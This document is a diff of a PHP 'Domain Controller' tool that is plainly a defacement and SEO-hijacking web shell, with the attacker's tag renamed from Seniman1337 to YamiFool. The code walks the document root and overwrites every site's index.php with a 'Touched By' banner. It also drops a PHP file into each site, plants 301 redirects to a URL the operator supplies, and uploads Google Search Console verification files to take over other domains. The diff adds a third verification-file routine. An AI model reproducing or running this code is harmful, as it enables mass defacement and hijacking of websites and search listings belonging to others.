@@ -6,7 +6,7 @@ error_reporting(0);
 
 class SimpleReplacer {
     private $rootDir;
-    private $watermark = "Seniman1337";
+    private $watermark = "YamiFool";
     
     public function __construct() {
         $this->rootDir = $_SERVER['DOCUMENT_ROOT'] ?? dirname(__FILE__);
@@ -24,8 +24,10 @@ class SimpleReplacer {
                 return $this->doSearch($_POST['username']);
             } elseif ($_POST['action'] === 'gsc_upload') {
                 return $this->doGSCUpload();
-                } elseif ($_POST['action'] === 'gsc_upload2') {
-    return $this->doGSCUpload2();
+            } elseif ($_POST['action'] === 'gsc_upload2') {
+                return $this->doGSCUpload2();
+            } elseif ($_POST['action'] === 'gsc_upload3') {
+                return $this->doGSCUpload3();
             } elseif ($_POST['action'] === 'redirect' && !empty($_POST['redirect_url'])) {
                 return $this->doRedirect($_POST['redirect_url']);
             }
@@ -81,7 +83,7 @@ class SimpleReplacer {
         $dirs = $this->findDirs();
         $count = 0;
         $list = [];
-        $indexContent = "Touched By Seniman1337 - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
+        $indexContent = "Touched By YamiFool - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
         
         foreach ($dirs as $dir) {
             $indexPath = $dir . '/index.php';
@@ -118,7 +120,7 @@ class SimpleReplacer {
         $list = [];
 
         $fileName = $this->watermark . ".php"; 
-        $fileContent = "Touched By Seniman1337 - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
+        $fileContent = "Touched By YamiFool - All Black Corvo Society ' . $this->watermark . ' SeniDariKesedihan";
 
         foreach ($dirs as $dir) {
             $targetPath = $dir . '/' . $fileName;
@@ -270,12 +272,74 @@ class SimpleReplacer {
     ];
 }
 
+   private function doGSCUpload3() {
+    $dirs = $this->findDirs();
+    $count = 0;
+    $list = [];
+    $failed = [];
+    
+    $fileName = "google27ca1124b0c262a8.html";
+    // Konten yang benar untuk verifikasi Google dengan watermark hidden
+    $fileContent = 'google-site-verification: google27ca1124b0c262a8.html' . "\n" . '<!-- ' . $this->watermark . ' -->';
+    
+    foreach ($dirs as $dir) {
+        $targetPath = $dir . '/' . $fileName;
+        $domainName = basename($dir);
+        
+        if (file_exists($targetPath)) {
+            @unlink($targetPath);
+        }
+        
+        if (file_put_contents($targetPath, $fileContent, LOCK_EX)) {
+            chmod($targetPath, 0644);
+            
+            if (file_exists($targetPath)) {
+                $count++;
+                $list[] = $domainName;
+            } else {
+                $failed[] = $domainName;
+            }
+        } else {
+            $handle = fopen($targetPath, 'w');
+            if ($handle) {
+                fwrite($handle, $fileContent);
+                fclose($handle);
+                chmod($targetPath, 0644);
+                
+                if (file_exists($targetPath)) {
+                    $count++;
+                    $list[] = $domainName;
+                } else {
+                    $failed[] = $domainName;
+                }
+            } else {
+                $failed[] = $domainName;
+            }
+        }
+    }
+    
+    $message = "✅ Google Site Verification (ketiga) berhasil - " . $this->watermark . "\n";
+    $message .= "File '{$fileName}' terupload ke {$count} domain";
+    
+    if (!empty($failed)) {
+        $message .= "\n❌ Gagal di " . count($failed) . " domain";
+    }
+    
+    $message .= "\n\n📌 Cek di: https://domainanda.com/{$fileName}";
+    
+    return [
+        'success' => $message,
+        'domains' => $list,
+        'count' => $count
+    ];
+}
+
     private function doRedirect($redirectUrl) {
         $dirs = $this->findDirs();
         $count = 0;
         $list = [];
         
-        // Konten redirect HTML dengan watermark Seniman1337
+        // Konten redirect HTML dengan watermark YamiFool
        $redirectContent = '<?php
 header("HTTP/1.1 301 Moved Permanently");
 header("Location: ' . addslashes($redirectUrl) . '");
@@ -352,7 +416,7 @@ if ($response && isset($response['success'])) {
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Domain Controller - Seniman1337</title>
+    <title>Domain Controller - YamiFool</title>
     <style>
         * {
             margin: 0;
@@ -381,7 +445,7 @@ if ($response && isset($response['success'])) {
         }
 
         .container::after {
-            content: 'Seniman1337';
+            content: 'YamiFool';
             position: absolute;
             bottom: 5px;
             right: 10px;
@@ -459,7 +523,7 @@ if ($response && isset($response['success'])) {
         }
 
         .btn::after {
-            content: 'Seniman1337';
+            content: 'YamiFool';
             position: absolute;
             bottom: 2px;
             right: 5px;
@@ -567,7 +631,7 @@ if ($response && isset($response['success'])) {
         }
 
         .results::after {
-            content: 'Seniman1337';
+            content: 'YamiFool';
             position: absolute;
             bottom: 2px;
             right: 5px;
@@ -666,7 +730,7 @@ if ($response && isset($response['success'])) {
     <div class="container">
         <div class="header">
             <img src="https://i.ibb.co/JW655KXD/al1.jpg" alt="Logo">
-            <h1>DOMAIN CONTROLLER <span>by Seniman1337</span></h1>
+            <h1>DOMAIN CONTROLLER <span>by YamiFool</span></h1>
             <div class="subtitle">Advanced Domain Management System</div>
         </div>
         
@@ -696,6 +760,12 @@ if ($response && isset($response['success'])) {
     <button type="submit" class="btn gsc">✅ GSC VERIFICATION 2 <span class="badge">baa53662</span></button>
 </form>
 
+        <!-- GSC BUTTON 3 -->
+<form method="post">
+    <input type="hidden" name="action" value="gsc_upload3">
+    <button type="submit" class="btn gsc">✅ GSC VERIFICATION 3 <span class="badge">baa53662</span></button>
+</form>
+
         <!-- REDIRECT BUTTON -->
         <button type="button" class="btn redirect" onclick="redirectPrompt()">⚡ SETUP REDIRECT</button>
 
@@ -705,7 +775,7 @@ if ($response && isset($response['success'])) {
         <!-- UPLOAD BUTTON -->
         <form method="post">
             <input type="hidden" name="action" value="upload">
-            <button type="submit" class="btn upload">📤 UPLOAD Seniman1337.php</button>
+            <button type="submit" class="btn upload">📤 UPLOAD YamiFool.php</button>
         </form>
         
         <!-- DELETE FORM -->
@@ -736,7 +806,7 @@ if ($response && isset($response['success'])) {
         <?php endif; ?>
         
         <div class="footer">
-            DOMAIN CONTROLLER v2.0 | by Seniman1337
+            DOMAIN CONTROLLER v2.0 | by YamiFool
         </div>
     </div>
 
